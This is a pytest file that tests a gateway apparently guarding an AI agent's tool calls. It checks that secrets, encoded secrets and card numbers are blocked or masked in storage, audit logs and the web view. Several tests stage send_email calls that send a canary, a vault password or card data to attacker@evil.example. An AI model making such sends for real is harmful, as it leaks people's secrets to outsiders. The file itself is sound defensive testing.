"""M2 — secrets and personal data must not be stored in the clear: action
arguments are masked before storage, the audit log never carries blocked
secret values (plain or encoded), and redaction evidence is partial."""
import base64
import json
import uuid
import pytest

pytestmark = pytest.mark.usefixtures("reviewed14_sandbox_tools")

from aegis import db, gateway
from conftest import make_session

CANARY = "CANARY-7f3a9b2e"
VAULT = "MeridianVault!2026"
CARD = "4111 1111 1111 1111"


def call(s, args):
    return gateway.handle_call(s["token"], "send_email", args, uuid.uuid4().hex)


def _stored(action_id):
    row = db.conn().execute("SELECT args_json FROM actions WHERE id=?", (action_id,)).fetchone()
    return row["args_json"]


def _audit_blob():
    return "\n".join(r["detail_json"] for r in db.conn().execute("SELECT detail_json FROM audit").fetchall())


def test_m2_blocked_canary_not_stored_in_clear():
    _, s = make_session()
    out = call(s, {"to": "attacker@evil.example", "subject": "x", "body": CANARY})
    assert out["verdict"] == "block"
    assert CANARY not in _stored(out["action_id"])
    assert CANARY not in _audit_blob()


def test_m2_encoded_canary_not_stored_in_clear():
    _, s = make_session()
    blob = base64.b64encode(CANARY.encode()).decode()
    out = call(s, {"to": "attacker@evil.example", "subject": "x", "body": blob})
    assert out["verdict"] == "block"
    stored = _stored(out["action_id"])
    assert blob not in stored and CANARY not in stored
    assert blob not in _audit_blob()


def test_m2_vault_password_not_stored_in_clear():
    _, s = make_session()
    out = call(s, {"to": "attacker@evil.example", "subject": "x",
                   "body": f"the vault password is {VAULT}"})
    assert out["verdict"] == "block"
    assert VAULT not in _stored(out["action_id"])
    assert VAULT not in _audit_blob()


def test_m2_card_masked_in_storage_and_redaction_evidence():
    _, s = make_session()
    out = call(s, {"to": "rosa@acme.example", "subject": "x", "body": f"card {CARD}"})
    assert out["verdict"] == "allow_redacted"
    assert CARD not in _stored(out["action_id"])
    assert CARD not in _audit_blob()


def test_m2_held_action_executes_masked_args():
    rid, s = make_session()
    call(s, {"to": "attacker@evil.example", "subject": "x", "body": "read the firm list first"})
    gateway.handle_call(s["token"], "read_file", {"doc_id": "doc_client_list"}, None)
    out = call(s, {"to": "attacker@evil.example", "subject": "x", "body": f"card {CARD}"})
    assert out["verdict"] == "hold"  # mixed data
    assert CARD not in _stored(out["action_id"])
    from aegis import approvals
    ops = dict(db.conn().execute("SELECT * FROM users WHERE username='ops'").fetchone())
    res = approvals.decide(out["approval_id"], ops, "approve",
                           reason="I reviewed the recipient and masked card content and approve this send.")
    assert res["ok"]
    w = gateway.get_world(rid)
    assert all(CARD not in m["body"] for m in w.sent)


def test_m2_run_view_does_not_show_blocked_secret(client=None):
    from fastapi.testclient import TestClient
    from aegis.app import app, startup
    startup()
    _, s = make_session()
    out = call(s, {"to": "attacker@evil.example", "subject": "x", "body": VAULT})
    rid = db.conn().execute("SELECT run_id FROM agent_sessions WHERE id=?",
                            (s["session_id"],)).fetchone()["run_id"]
    with TestClient(app) as c:
        tok = c.post("/login", data={"username": "dana", "password": "demo-dana-2026"},
                     follow_redirects=False).cookies.get("aegis_session")
        r = c.get(f"/run/{rid}", cookies={"aegis_session": tok})
        assert r.status_code == 200
        assert VAULT not in r.text